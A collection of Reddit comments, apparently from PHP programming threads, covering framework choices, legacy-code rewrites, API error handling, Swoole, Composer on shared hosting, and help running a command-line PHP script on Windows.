I think this is a feature where if you want to use it, you want it to be the default for every class you write, and in that circumstance I would much prefer a keyword rather than an interface.
Ansible pull
Drupal. It does everything you just listed except private messaging out of the box, with about 15 minutes of work. The private messaging is about another hour of work. Let me know if you have any questions.
i don't know if a file system could get all the images with alt of "" and run the model on them save the changes take the code into a command make the server run it every min 
It might not be written in PHP but you could certainly use this for RT messaging in your PHP app.
Thanks! Reading the docs now, much appreciated!
Assuming you're asking for this particular use case and you haven't written or you're not familiar with anything similar my answer would be... Laravel (tadaaa) Note however how deceiving this question might be when you stop and think on its assumptions: You're writing the set of the most basic use cases in web apps, for the first time, from scratch, with short deadline - It should never happen! The fastest way to write code is to reuse the one you already have (copy &amp; change, recofigure or recompose). When it comes to creating CMS-based web page terribly written Wordpress will beat any framework - you already have MVP and don't need to write anything! Of course you could write better CMS using frameowrk or set of libraries and maybe even reach a kind of SOLID nirvana, but the question you're asking wouldn't make sense anymore. The general "fastest development framework" becomes false premise at some point, because it speeds up things you write often, and those could be written once. In the end you'll have to learn programming anyway, because using metaphor: It won't matter how fast car you drive to (real) work if it's a substitute for only couple minutes walk - you will gain nothing in commute time compared to efficiency at work that takes the most part of your day (learning your craft and gaining domain expertise). "Walking" is also good for your health:)
i guess that would need a db table for image path and there alt
Laravel is pretty much just a collection of symphony components. It defiantly doesn't have more features
https://link.medium.com/VDQHrOHQZU
42
A parsec is a measurement of length, not time ;)
Easysoft do an ODBC join engine that lets you do heterogeneous joins across any odbc database. [https://www.easysoft.com/products/data\_access/odbc\_odbc\_join\_engine/index.html](https://www.easysoft.com/products/data_access/odbc_odbc_join_engine/index.html) &amp;#x200B;
Default enabled extensions in PHP have no meaning. Either it's hard required or it's not, and there are very few hard required extensions. Whether it's enabled by default or not matters very little once things have gone through the packaging grinder.
Just guessing. Maybe because multibyte environments weren't defacto at the time. 
That makes sense, thanks.
Slim-Twig-The ORM of your choice 
"S3 costs barely anything" - not really. It's cheap and quick to start with, but once you got some serious traffic it may be several times more expensive than for example renting bare metal server. It obviously has it's benefits in many situations, but the price can quickly rack up and in some cases become a serious issue.
Rails because I know it better than any PHP frameworks.
&gt;Storing user avatars, which is the best way? 
as someone who works with point of sale systems: Oh dear god, no
I would host them as files locally, and then set up some caching CDN for them if necessary. That way I'm in full control of my files and can quickly change the CDN provider if I want to.
What you wrote is undoubtedly and undeniably true. But the person before you stated: &gt; You can't use pdo postgresql because it's blocking That's pretty straightforward - and yes, you translated what he meant - you block the event loop because PDO is synchronous so you can either offload to a thread(pool) or another process or swap to a library that supports async operations. However, this is not a swoole problem so it's not a downside of swoole. 
I've currently been working on the same project for about 20 years now. Started as a simple one page PHP script to display a report from a MS Access database, and has expanded to a system that processes several billion dollars per year. Which is by no means a huge accomplishment in the grand scheme of things, but it is for us. &amp;nbsp; Motivation can be tricky when you have a long stretch of maintenance where you basically feel like a high tech janitor. But if you start looking at your interactions with legacy code as an opportunity to spot refactoring candidates, things start to get more interesting. You start seeing how to clean up these messy spots and expand your test coverage. Which for me, has become just as an exciting opportunity as anything. &amp;nbsp; Speaking of legacy code, I always find it interesting reading about people that run from it. But, anything you type today is legacy code tomorrow. Eventually you will have to work on it. Unless you just keep skipping to the next job so you can work on the latest and greatest until it is stale. Then leaving it for someone else to clean up your mess. That doesn't make you a good coder, just an asshole. &amp;nbsp; Rebuilding from scratch is almost always a bad idea. However, there are certain cases where it is beneficial to do so. I've always taken the approach of small seamless changes, and how can we do this without anyone hardly noticing. Rebuilding not only comes with its all new bugs and issues, but if it requires a break in the user interaction, it will also cause increased issues for the support/sales/etc team. &amp;nbsp; I don't have many tips and tricks for scaling up. I'm interested to see what others have to say here, as I am currently in the middle of expanding our team which is a new experience for me. &amp;nbsp; I've seen people write/design messes in several different languages, so not I don't think language choice matters much. You can also have clean code and end up with a overall complexity that is just as bad as a few files of spaghetti code. 
I agree with it except one point: "Real-Time Web Applications"
Tell me about this Ajex.
Do you have a link to a shared host that gives you an isolated vm?
What about this one? [https://developer.hyvor.com/tutorials/php/oop-intro](https://developer.hyvor.com/tutorials/php/oop-intro)
One of the worst ones I've seen was where session tokens, rather than being stored in cookies, were stored in the query string of the URL. Then when the user logs in, a session is created in the database with a random variable and that variable is then appended to every hyperlink in the application and the application checks for that variable in the query string on each request to load the current session. If the user typed a different url into the address bar they were logged out. I showed this to another developer with horror and they said "oh yes well that might be because the O'Reilly book on PHP development from way way back actually taught you to do sessions like that". The whole project was very clearly undertaken as a learning exercise from someone who didn't have the foggiest idea what they were doing.
&gt;Rebuilding from scratch is almost always a bad idea. this will obviously depend on the specifics of the project but in my experience, most of the complexity around the project is not actually in writing code it's figuring out what code you have to write. As in the complexity is more around understanding the problem, agreeing what features you need, identifying problems, investigating technical solutions etc. than actually writing code. Therefor rebuilding bad code is almost always simpler than the clients think it's going to be. I've rebuilt systems that took 6 months to build in a few weeks because by the time we came to rebuild we already new exactly what it was we needed to build and what the challenges were going to be and how to overcome them because we'd been through it all before. &amp;#x200B;
&gt; makes it really fast to have something up and running. I think Symfony and Laravel target two different types of developers. Each set that prefers one over the other is capable of getting a project up faster in the preferred framework. Speed is relative.
This is understandable since .NET has the **M**odel **V**iew **P**resenter pattern. This was what I thought of immediately.
You don't have to ask permission to store cookie if you store everything in the query string \*picture of roll safe meme\*
No it isn't but I know what you're talking about, I saw that after SaraMG retweeted it. Funny enough I saw it a day after I started kicking around the idea of trying to write the functionality myself. I don't know the PHP source well enough to do something of that complexity yet though, honestly. 
I hate putting off platform updates. But in our case we're aligning the platform updates (PHP versions, and migrating Azure -&gt; AWS) together and due to the overhead of moving platforms we didn't make my goal of being off 5.6 by December 2018. Developers are always quick to harass people for not upgrading without understanding the valid business concerns which may impact when these things are done. I'd say many are pure zealots about this. Even in this thread you see `“Still need IE6 support?”` and people offering advice when it does absolutely nothing to impact the project or team. The hard truth is that business stakeholders have to balance business needs with keeping their infrastructure up to date and modern. Not everyone out there is reading r/php and wants to always run the latest and greatest. Some people just don't care and it's *100% ok*. Just do your best to not still support PHP 5.2 in 2019...
[removed]
lol yeah, I remember Invision Board (IPB) &lt;= 1.3.1 did that
laravel, you can spin up a new project with auth in 5 minutes
8 years working with it and still learning something new every other day.
https://www.mittwald.de/hosting/webhosting for example (German)
Return the appropriate (4xx/5xx) HTTP status code to indicate that something went wrong. Put additional details in the response body as JSON, if applicable.
HTTP status codes. If you want to return any details about the error, there is a "standard" way described here: [https://tools.ietf.org/html/rfc7807](https://tools.ietf.org/html/rfc7807)
That is really nice, but i think one of the main challenges will be when you scale the team. because usually scaling team means more features and developers are not the same. some have the passion to scale up with every feature and some just put code there to get job done. 
OMG, that is ridiculously funny :D
If you're searching for how to structure the response (not talking about the headers like the others) then there's no real language-wide standard. You COULD use this for example https://jsonapi.org/ but as I said, there's no industry-wide standard of how json responses should look like, so you're free to go. 
It's the most used platform for development :P I get surprised at other's surprise
Proper HTTP status codes are the first step. Let's say you're sending a GET request to `/api/users/123` to fetch some data about the user with the ID 123. On success, this should return a 200 response. If user 123 doesn't exist, it should return a 404. If the current user doesn't have permission to view user 123, it should return a 403. You get the idea. Use the proper HTTP status codes, don't just send a 200 for everything. Using just the status codes, you can easily generate and display generic success/error messages in your JS. If you want to pass more data to your JS, include it in the response body. For example, a 404 response might have a body like `{"error": {"name": "Not found", "message": "User 123 could not be found"}}`.
I'm looking for a time serie database for PHP. &amp;#x200B; Something sharing some features with Sqlite : \+ file based, that can be ported from server to server. \+ No need to for high concurency (traffic will be hourly, at best). \+ With access from PHP (of course) \+ If it exists an GUI that could display those data and help humans navigate &amp;#x200B; I definitely can do it with SQLITE, but I'm looking for a more specialized solution. I checked the some time series (influxdb, graphite, timescaledb) but they are too much for my use case. Any suggestion? 
My code is shit, though, but if you want I can explain some basic ideas and methods (and where I stole code from).
Is it the job of an application to tell you how to configure your server? Probably not. Is it useful? Probably, but depends who your audience is. For WordPress where it's often used by people with less technical knowledge, is probably going to cause lot's of confusion / worry (perhaps rightly so) for people - where as an app aimed at being installed and maintained by techies, a small page / tool with this info on maybe useful.
If that’s the scope of the application, by all means. But if it’s not, I don’t see why you should?
WordPress 😂 it’s got CSS
Why not?
The application's security is the admin's concern. Thus a "system check" function would be helpful for him (or her) to notify about security issues.
Sure, a system check page in the admin part is what I'm talking about.
Nice reply! Thank you!!
A great quick read: &amp;#x200B; [https://martinfowler.com/articles/richardsonMaturityModel.html](https://martinfowler.com/articles/richardsonMaturityModel.html)
We use this successfully: https://oss.oetiker.ch/rrdtool/. - File-based and can be moved around relatively easily. - If you're doing concurrent updates you have to ensure that data arrives in-order. RRD will yell at you if you try to update the past. - [Has PHP integration](https://secure.php.net/manual/en/book.rrd.php). - You can output graphs on a page. Ticks all the boxes? :)
To avoid severe consequences of a potential security bug?
\- It not working on Windows is not a downside. There's no logical reason to host PHP or anything PHP related on Windows. Windows doesn't implement POSIX, so it's extremely difficult to keep track of different implementations and then dedicate time to an OS that's not even being used for the purpose of running PHP. If you run PHP on Windows, my condolences, you shouldn't. \- It's usage is not niche. \- Usually, we resort to stacks built on Node.js to achieve what we can achieve with swoole. &amp;#x200B; You're obviously basing your standpoint based on your own experience, but there's a whole wide network of people who use PHP for more than gluing a bit of data to HTML and spitting it back. &amp;#x200B; If you have a process that takes 1 second, to separate it to different threads you first need to know \*where\* you're threading, what you'll wait for and how to split the task to two threads - this is done by the programmer. If this were so easy to do, every single program out there would benefit from CPUs such as AMD's Threadripper - but it's not happening. Your example is entirely wrong. &amp;#x200B; Swoole optimizes the startup cost of a PHP process and request lifetime. Down to the core, when we actually get to executing PHP - it's really, really fast. To prepare the playground - that's super slow. &amp;#x200B; I don't know where you went with your post, it looks like as if it was written by someone who never used swoole (or used it sparingly, for a few minutes or so) and who doesn't even work in this so-called niche, all for the sake of writing \*something\*. &amp;#x200B; Had it been a niche, there'd be no swoole nor need for it. But, several of the top 100 (or even top 50) companies of the world are funding quite a large team for swoole development. You don't dump any money in a "niche" thingy, and no one funds anything just for the lulz. &amp;#x200B; &amp;#x200B; &amp;#x200B; &amp;#x200B; &amp;#x200B;
My most legacy codebase is a CakePHP2 project. Code is (slowly) moved to other code bases, but some of the most important parts are likely still to stay for some time. Things which helped me: - write tests - write tests - write tests - improve the test writing experience for developers - write tests In this specific case, also: - move stuff away from controllers/behaviours/components/whatnot which are all CakePHP2 specific and put it into pure PHP classes =&gt; less dependencies, easier testable - the ORM/model concept is a true joke so I've integrated Laravels database package and it's container and migrate to it - improving the test suite was the #1 thing to improve the overall quality, which means: make it fast to run, make it easy to write (complex) tests (i.e. tests with lots of setup boilerplate because complex system, etc.) - the test code would only work with PHPUnit 5 so I worked on this and ripped everything out which wasn't necessary and it's not running PHPUnit 8 and supports all the latest feature and we can finally properly debug/run coverage =&gt; a blessing One of the most important learning from this was: always try to write your most critical application parts in a framework-agnostic way. That allows you to easier switch out things or introduce new layers without too much friction. Been working on this Legacy project for almost 5 years, still love it (but also building new stuff around it, so it's not all bleak)
As a developer, I'd be more interested in how your application was allowing the possibility of an exec like that being run? 
&gt; Share a story about working with a legacy code! A story I've told many times before: https://www.youtube.com/watch?v=65NrzJ_5j58&amp;feature=youtu.be&amp;t=641 (that part ends around 12:56) &gt; Do you even believe that refactoring is a good solution vs rebuilding the whole thing and how could this affect the business. Yes, so much so that I wrote a book about it: [Modernizing Legacy Applications in PHP](https://leanpub.com/mlaphp). Best of luck!
OpenCart still does this.
Just posting here saying that Maxell is a guy who fucks! Dude helped me a bunch on SO chat and is still pwning. You go, dude, you go!
What would that potential security bug be? Do you even have anything in mind or is it just a witch hunt?
As a system administrator, I need to be able to define the environment and have it under control. PHP allows me to blacklist functions I want to disable. It also lets me run PHP-FPM under certain user. &amp;#x200B; To have my environment under control, I'll use automation tool such as Ansible. I'll explain how my setup needs to be configured, from PHP to nginx etc. &amp;#x200B; To avoid PHP doing anything dangerous to the underlying OS, I'll containerize it (LXD is my go to tool). That way, if anything bad happens - I'll scrap the container and boot another one - with prior bug fixing. &amp;#x200B; Now, if I had an app that does some sort of power-on-self-test, I'd go mental. &amp;#x200B; Reasons: &amp;#x200B; 1. You can't predict which functions I need enabled and which I don't. That P.O.S.T. would yield false positives, I'd stop trusting it instantly 2. What about upgrades? When do you decide what's the next thing you need to warn me about? Your app is not my every day life. I don't want constant updates and reminders about your app. If you do your job right, I get only critical notifications or a weekly/monthly reminder (via email) that a new version is up, with changelog and what's been changed. 3. An app should do one thing and it should do it well. Don't go off by checking every possible combination on every possible OS to MAYBE determine there's a potential hole. TL;DR: no. App should not warn the user that \`exec\` passes. We have the tools to prevent apps from doing catastrophic damage and sys admins have the tools to bend PHP and entire OS to their will. We simply need to use those tools properly. These functions you're mentioning tend to have big use case, so there's no need to fuss about whether someone can \`exec('ps aux | grep php');\`, not everything is a glaring security hole waiting to be exploited by cryptofarmers. 
those details, assuming Google Translate is correct, looks like normal old shared hosting. if you had a vm of your own they wouldnt need to restrict via `max_execution_time` because the VM manager would restrict based on cpu/resource usage same for the `memory_limit`
If someone has built a system that lets users upload arbitrary PHP code to their systems, that's obviously a huge issue. Or if it's running eval() on user submitted data. But in that case, you're already toast. &amp;#x200B;
Even if we completely ignore credit cards as part of the equation, POS systems are not something you hack together in 30 minutes of youtube videos
That was a decent number of words to not really say anything.....
Thanks - I think this will be helpful. Compose locally, then upload, if I'm understanding. 
It's been about six months since I last tried, but I think it had to do with not being able to get all the dependencies installed. As @paraLogiki suggested I'm going to try to do this locally, then upload. 
I'll give it another try (it was about 6 months ago I last tried), thank you!
Maybe some composer lib?
Thanks, something different. I hadn't checked out Cake in forever. I just assumed it had gone the way of CodeIgniter or Joomla and was outdated. 
I've been doing this for 10 years! Problem is it gets me stuck in vicious cycle :)
Vet the code you're using? 
Seriously though, who does that? do you really think someone who does a "npm install" or a "composer install" will check every single file to see if there's some malicious code in it?
Thanks, I appreciate a different suggestion. I actually did Drupal dev for 6 years at a university and would agree that it is quick to get the requirements I mentioned set up quickly, but of course I left out that I want it to be scale quickly in terms of customized features. I always run into limits with doing things The Drupal Way. At a certain point the architecture just gets in my way and I end up spending time creating modules and entities to do things as I would without Drupal. Mostly a data modeling difference imo. I prefer to write my own SQL and design my own data model as the center of how I conceive of an application. I don't mean to ramble but am just curious if you have a different perspective. 
isn't that the one with the maintainer who refuses to fix security issues?
Thanks. There is another suggestion for Drupal in this thread which you can see my reply to. I left out feature scalability in my requirements, and in my experience with Drupal I always get to a point where I want to cut myself because I can't do something simple but need to do it the Drupal way. I'm not talking necessarily about basic things but more fundamental data architectures. I just don't quite get the entity model like I do plain relational data, both at the database level, but also at the query and architectural level. Any thoughts you have on this are welcome. 
&gt; Do you even believe that refactoring is a good solution vs rebuilding the whole thing and how could this affect the business. It's easy to decide and much more fun for programmers :) Business-wise? → [Things You Should Never Do, Part I](https://www.joelonsoftware.com/2000/04/06/things-you-should-never-do-part-i/) - I've been there, decided to go for re-write from scratch, it cost 3 years on old and new code. Now I know never to rewrite :) &gt; Do you think programming language choice may be a reason behind messy code :D? Not really, that's how evolution works. State of art today will be legacy in 3 years. --- Recently, I'm focusing on turning legacy codebases to brand new ones in an effective way. How effective? Recently we [switched PHP app from framework A to B in 3 weeks](https://www.tomasvotruba.cz/blog/2019/02/21/how-we-migrated-from-nette-to-symfony-in-3-weeks-part-1/). - What PHP version it is in? - How does legacy look like? Spagetti? Custom MVC? Functions only? - How big the team is? - What do you want to do with the code? - Why? Business, more features, security fear etc. 
It's an important concept for a developer or anyone on a project to have in mind in order to understand the target goal. It helps when stakeholders keep coming up with new ideas that make the project look like it will never be ready. 
Two simple checks, is it being maintained actively, and is it being used widely? If yes, then barring compromised repos, then it is probably safe, if not, then damn right I'm reading it before I use it. 
You should check again. I used it in a job interview once. Created the tables in mysql, run script to generate the forms done. Lol
Nope spot on. D8 is far better, so maybe that line has changed for the more complicated things but you are spot on. D8 is based on synfony kernel which has improved things considerablely but it still has a high level of complexity that sometimes gets in the way.
Thanks for the tip!
Well, you're building a prototype/mvp, so why worry about scaling or doing things a certain way? Seriously. I know of many custom web apps which started in Drupal which went on to use their own custom development efforts to actually become what they need to be. With that said, as per your other comment. \`\`\` Mostly a data modeling difference imo. I prefer to write my own SQL and design my own data model as the center of how I conceive of an application \`\`\` Again, if you're building a MVP/Prototype, why worry about those things. Or, what exactly are you thinking of doing that you don't know if drupal can do? I would also say that \_many\_ AAA web properties run drupal as their main application, which even powers many secondary applications, so, its not that its easy or harder, its just what you know. &amp;#x200B; Let me know if you need help.
2close2home
Indeed, this is good idea. Thanks for the suggestion, I'm checking this.
Yeah, I've been there. As icky as it is, just uploading the `/vendor` directory to the server is about the only consistently reliable way to get Composer dependencies to work on a shared host. 
whats css?
\+1 for admitting mistake. Cheers!
I'm old. That's not icky, it's straightforward. :)
He is also famous for being unfriendly.
These must have been small systems if you can build them in a few weeks. On terms of rewrites I mostly agree with Joel Spolsky: https://www.joelonsoftware.com/2000/04/06/things-you-should-never-do-part-i/
There has been a lot of discussion around the syntax and implementation proposed, do you have any thoughts/changes you'd make to their implementation or is it similar enough to what you'd want?
Json with status codes. The whole idea of mapping your application (sometimes) to HTTP status codes continues to be a bad idea. Develop 2 apps. One with an HTTP error code mapping and one without. It's clear as day which ends up with more code, for no technical benefit, which is more maintainable (clear intent with minimal bikeshedding), and which is faster to deliver.
Yes, you can do some composing on server, like dump autoload. But a lot of shared hosting, including Dreamhost limit CPU time and composer often uses too much especially for install command. At least it did in previous versions.
Please no. This is less secure than TOTP (a.k.a. apps like Google Authenticator) because you're relying on your phone service provider. It's not hard to socially engineer telecom companies into giving you access to someone else's account. It's also hella annoying to get phone calls for this sort of thing. It really isn't any better than SMS OTPs.
It's probably interesting to beginners, but otherwise, yes. I've worked for companies where generating "content" for the blog (to attract engineers and improve SEO) is seen as an tedious chore worth avoiding. Perhaps it would be better in PHP beginner subs... 
You've only been making MVPs inside 40 hours for 10 years? When you have a longer term project is a great time to try new things. (And potentially choose against it if you find it's not working the way you hoped it might.)
Good point, but I'd also argue it's even more non-relevant for beginners because they weren't around in the "dark days" of php, so they wouldn't really have a good point of reference.
&gt; I've currently been working on the same project for about 20 years now. "It would be nice to have that kind of job security." ;-) But more seriously: well done, and great display of commitment.
Why..?
Miscommunication. When I need to roll up a quick mvp I've been using the same tools for 10 years. I've worked on all kinds of other systems and scales, but haven't found anything as quick as my old system. Incidentally, longer term projects tend not to be the place to try new things in my experience due to risks, in particular technical debt. 
This is a down side of swoole, any library that does IO AND not have async support is a huge limiting factor. So your limited to async or continuation libraries, if you do not want to block the event loop. Swoole uses libuv which is the same as NodeJS, it has other adapters but those are the same concept. On top of that, if swoole is setup as multi process, then you cannot change the shared data between the processes which normally means putting threads in the same swoole instance is not idea. Swoole does have an atomic memory feature called Swoole table, but you'll need to serialize data, introducing more complexities. Overall adding threads to Swoole does more harm than good. By adding threads you introduce context switching and locks which could defeat the purpose of swoole on the first place. In general if you need to use a blocking library or something computational, then your better off creating a worker / job service like Gearman, or Bernard. Note swoole does have a process library for spawning a process within itself, but it does not that your blocking php code and separate it on it's own, you still need to do that.
Business that sells communications tools offers products relying on communication, news at 11. My guess is they make a pretty tidy sum from 2FA SMS texts.
When I look at Stack Overflow... 90% of them are still using tutorials written in the "dark days"
Use guzzle Https package with GET, not file_get_contents
I'm 90% sure that you need to user curl, i don't know if there is a new method in PHP 7 Do a quick google search "api call php"
We are approaching the end of a rebuild and improve cycle at work, I joined about 3/4 of the way through. It has been likened to pulling apart a Robin Reliant and turning it into a Ferrari, while driving it along a motorway, without stopping. 
Just tried and worked fine for me.
According to http://php.net/manual/en/function.file-get-contents.php your code should work. Could the URL you're trying be unavailable? Perhaps try another URL for testing.
I can't seem to get any to work, I installed XAMP recently and tried in a new folder, this is everything being outputted Warning: failed loading cafile stream: `C:\xampp\apache\bin\curl-ca-bundle.crt' in C:\xampp\htdocs \test\index.php on line 4 Warning: file_get_contents(): Failed to enable crypto in C:\xampp\htdocs\test\index.php on line 4 Warning: file_get_contents(https://api.icndb.com/jokes/2): failed to open stream: operation failed in C:\xampp\htdocs\test\index.php on line 4
Download `cacert.pem` from https://curl.haxx.se/docs/caextract.html, move it to `C:\xampp\apache\bin\` and rename it to `curl-ca-bundle.crt`. Restart everything XAMPP-related. Does that help?
From that my first guess would be that your setup isn't ready for Https. The warning mentions failure to load a certificate and then an error on missing crypto. If possible try if an http source works
Yes that fixed it, thank you
That worked too just doing http
IIRC mbstring adds a few mb of memory footprint to each ohp process. With dozens or even hundreds of php processes on a server that adds up. There are many use cases for php without mbstring, so why force it to always be loaded?
Oh that's quite interesting, I'm surprised it has such a large footprint.
&gt;build in a few weeks &gt;because we'd been through it all before These seem like the two most salient points. If the project is small enough that it can be built in a few weeks with perfect knowledge of what needs to be done and the team working on it were directly and recently involved in the previous system, a rewrite can be beneficial and save a significant amount of future debt. Generally when people warn against rewrites its because they had experience with projects with huge numbers of moving parts, where even a small team would struggle to perfectly understand everything the system does and all of its internal and external interactions. A common consequence is breaking user's workflows because nobody new that the system was being used in the way some small section of users were using it. It comes back to something I've brought up in these parts before, that generalised advice from developers unfamiliar with the specific situation you're working on can often be woefully bad, even if for them the advice is very good. The gulf in scale between two different PHP projects can be enormous. Even between companies at a similar scale - the kind of problems that Wikipedia has to solve are completely different to those PornHub is solving and they're both dealing with completely different kinds of problems to an intranet site with a thousand users but a fire hose of terabytes of data a second from industrial sensors.
It say part 1 so will be more than 30 min
I’m not sure why you’re defending this video, there is nothing redeemable about it. It’s the same low-grade YouTube tutorial spam that gets posted here 10 times a week. It teaches bad habits and dangerous practices and should be discouraged as much as possible. 
Der are four categories of extensions: - a random extension somewhere on the internet - an extension maintained in php-src - default enabled one - enforced ones Enforced ones are things like date and standard. They don't have dependencies on "special" and should be enabled everywhere. Default ones are enabled when you take php-src and run plain "configure" those are useful things, like regular expressions, but have an external dependency (libpcre in case of regular expressions) Bundled ones are kept in any with PHP but have some bit more limited use (i.e. some database modules, only relevant for people who use the specific database) The remaining ones are pecl and random internet sites. Now in reality a majority of users don't use the PHP source and compile the selves but use distributions provided packages. Distributors love to split up in as many packages as they can, so they only have to update small packages for security fixes etc Now all that has another dimension for mbstring: mbstring uses an external library under LGPL license. This has licensing impact on people distributing a binary, as the (L)GPL virality kicks in as then the whole binary file (be it the main PHP executable if built in statically) or the shared object (if built shared) must be distributed in a way that the receiving entity can rebuild it, that's not required with PHP itself (LGPL is a tiny bit more complicated than this basic summary, so don't take as legal advice) So for being clear on the PHP/BSD-style licensing it can't be default and certainly not enforced.
Great explanation, thank you.
Slightly off-topic, but weak-references need to be standard. They are insanely important to have when it comes to stuff like listener-frameworks or avoiding duplicate objects in ORMs.
Actually for the most part the cost isn't relevant. The code and static Unicode tables etc are in read only memory pages which are shared between processes. Only overhead is from things like the slightly larger function table, which is created per process (well on fork() of the child processes it is the same table, but on request start it is copied to take custom functions etc.) The cost is quite negkectable.
Really don't like twig and how more things are using it. I get the idea of a sandbox, but I'd rather see a sandboxed version of php than having to learn another language. 
Jhipster, if you don’t mind learning some java 
The irony, Stack Overflow helps to spread it further. That "gamification" stuff encourages people to give a new answer, as quick and dirty as possible, instead of showing a proper tutorial/practice
http://php.net/manual/en/function.file-get-contents.php
 i got code that does what it is supposed to do in a free web service that just asks for a number and tells you how it is spelled in english. do you recall any web service that is xml based that requires more fields in order to do something ? maybe headers ? or security? or login? it would make my day so happy if you got some. so i can test and check it out. 
If that were what he was talking about, he wouldn't have any issues getting Laravel set up on that host.
maybe https://httpbin.org
Tbh, considering you ain't a superhuman: you just can't. This isn't just about PHP, but all languages out there. And even if you do you'll regret for spending so much time for things which you'll never use. My suggestion, try to implement solutions to real life problems as you learn alongside what's really necessary. You'll end up being a good programmer.
Another one for Drupal here, echoing all of alphex's statements. You get all of your requirements with a contributed module (private_messaging) and core. Drupal 8 uses Symfony now too, so you get your framework requirement as well.
My thoughts exactly.
Greed is the worst of deadly sins. You are posting this dangerous bullshit in hope to get some few pennies from your youtube channel. Due to spammers like you many people learning PHP have no idea how powerful, secure and easy language it is. 
Tutorial teaching SQL injection. Perfect.
i usually stop reading anything tech related thats 'powerful' but this one is powerfull too, must be true then
Had to chuckle at this: &gt;2.3 Migrations (bug to fix - please make manualy) &amp;#x200B;
Hi, are you following the instructions in the readme? There is a terminal command to run there. 
The bug is not fixed couse we are moving to Conso package/console manager [https://github.com/lotfio/conso](https://github.com/lotfio/conso) But if you want to run migration u can run via url in Routes web create new router `Route::get('/migrate', 'Migrate@up', 'migrate', 'migrateMiddlewear');` With Migrate middlewear u set up to check only for localhost ENV and then you can run via localhost:8000/migrate 
I can't believe you're actually doing this. You should teach them how not to get MySQL Injection'd next, will really compliment this video "Mark Oliver".
Learn another language as in learning the template syntax? Do you not use template engines then? Not trying to be rude, just curious.
I completely understand and I applaud you. I just can't help chuckling when I see things like this in (let's call it official) documentation. Btw, I like what I see and will give it a try this weekend Keep it up.
the php dumpia.php --fanclub &lt;id&gt; --key &lt;key&gt; --output &lt;path&gt; [--verbose] [--downloadExisting]? i tried that. i have the id (i think) but idk what the key work be or where to path it. i'm putting this in the php application because the dumpia file keeps closing
Well offical documentation is not complete yet lack of people in developing but we have few streamers on [twitch.tv](https://twitch.tv) and yt that do some videos and CMS stuff, Thank you 
What the key is is given in the readme. You need to use your browser to login and get the session ID via looking at the network headers.
You need to follow the instructions in the README, the command line arguments are required, you won't be able to just run the file and expect it to work. &gt;but idk what the key work be or where to path it The README tells you where to get the key from, the output path is just the path on your computer you want to save this data to.
Hire someone who speaks and writes English to write your docs - it comes across as unprofessional when you have spelling and grammar mistakes.
i've gathered the id and key and also made a folder for the path(if that's right) i entered the id which im assuming is the 4 numbers after fanclub in the url. the _session_id from my cookie. and the output path with i copied from the file explorer. i copied that into php.exe and hit enter and nothing. i know im doing something wrong. sorry i'm new to all this ;-;
In command line, if you run the command: php -v what happens?
OK here goes: 1/ You should read the readme fully as some of the questions you ask are answered there. This goes for any kind of script you're using – don't know how it works? First step, read the whole readme file! 2/ Are you running the command that was given (yes the one you quoted) in a terminal of some kind (linux terminal, macOS terminal or windows command prompt) ? Because you'll need to do that – this script is not an application with a graphical user interface so you can't just double click it – that isn't how this kind of PHP script works. Also you need to move to the directory which contains the script you downloaded (so if the file is still in Downloads folder you need to open a terminal and then navigate to that directory using the terminal commands). 3/ The Path is wherever you want the script to put the output. The best would be to create a new folder for this in your home directory and then use that. So if you made a new folder called 'dumpia-folder' (avoid using spaces in the name as it makes using it on the command line more difficult for a beginner) and then the 'path' part becomes \~/dumpia-folder/ on Mac and Linux and %userprofile%\\dumpia-folder\\ on windows. For these first two points, if you have no idea what I'm talking about, you might want to follow a tutorial to learn a little about using the terminal/command prompt in your given operating system, as this is required for using this kind of script. 3/ For the key, as another user said, you should login with a browser and then use the inspector window of the browser. Depending on browser mostly you can open this by using Right Click on any part of the web page &gt; Inspect Element, then you will need to switch to the NETWORK tab of the inspector. Now that this window is open, refresh the web pack. In this list of requests that you now see, you need to find the item that corresponds to the last part of the URL of your current page (so if the URL is xyz.com/home the request would be for '/home', if the URL is [xyz.com/example/](https://xyz.com/example/) the request would be for '/example/') in the list of requests for the page. For that item you'll need to select it, and then in the pane on the right that appears, click 'headers'. There will be a Session ID shown in those headers. That is what they are talking about in the readme for the script. 
i get nothing
Getting nothing seems really unlikely. You'll either get the version of PHP you have installed, or an error telling you it's not installed.
we will do when the proper documentation will be done 
You don’t have php modules installed for either Apache or nginx.. unless you’re on WinBLOWS then I think it’s called XAMPP but you need lib-mod-Apache for Apache or php-fpm for nginx 
I did once have a rewrite go pretty well... In 2015 the agency I worked for at the time was asked to look at a Zend 2-based lift sharing web app. It had been in development since late 2012 but still hadn't gone live. The front end was a load of horrible Require.js based widgets that would have felt clunky and outdated in 2012, and it felt very enterprise-y. They wanted it to be made responsive, but after a week I hadn't made much progress. I decided to recommend a rewrite on the following basis: * A lot of the functionality was redundant, so since we knew what was necessary we could just concentrate on recreating it as an MVP * The tooling had moved on - using Gulp, Angular 1 and Laravel I was able to produce a working prototype in a couple of hours that already had a better workflow than the original version * Redoing the front end with Bootstrap allowed us to make it responsive from the outset * It looked pretty tired - rebuilding it from scratch let us create a new design It took myself and a designer 8 weeks to turn it around, and we were told the client was very happy with the result, and was talking about adding a Phonegap app. I think in that case it went OK because the application wasn't yet in production, we focused solely on building out an MVP, and the scope was fairly limited, so it didn't get bogged down at any point. I'm painfully aware that this is very much an exception.
Jesus Christ no
if putting the php -v in the php.exe which looks like the cmd that's what im doing. i hit enter and get a blank
right now our priority is to push to next release and help from the community is key to provide best solution for someone who is new in PHP world and/or someone who is an Expert 
i think i've got all the info for the script down. i'm using php- 7.3.3 when i open the cmd looking file and paste the command exactly like it is but with the info it requests i just get a blank
i am using windows lol. where would i get the files mentioned and how would i go about put them in?
Linux
but i don't have linux
[They will be in 7.4](http://git.php.net/?p=php-src.git;a=commit;h=6529d7acd9912a609924633a43e6562799566225)
For the children
Install virtual box and download Ubuntu server 18... if you want to be a developer you’ll need to learn Linux... full stack developers make almost 150k a year because they also know Linux and how to setup the web servers 
No, just a regular command prompt, forget about running the php.exe directly.
Talk about drifting off topic and peddling useless information!
This is the only reply with useful information. 
Are you definitely doing that in the correct folder?
Can you paste the full command you are pasting into the command prompt here including with the substitutions? 
https://www.makeuseof.com/tag/linux-market-share/ Useless my ass... man is everyone on Reddit always pissed off and haters?
The OP is new to development, getting started on Windows is no less useful than Linux for a beginner. You’re adding to the noise, rather than offering useful direction based on the original question.
Okay say OP decides to take development as a career and lands in a Linux environment? Teaching bad habits at the very beginning is completely stupid... don’t diss it because you don’t know it... who builds without the idea of expansion? All you’ll do is end up hitting a dead end.
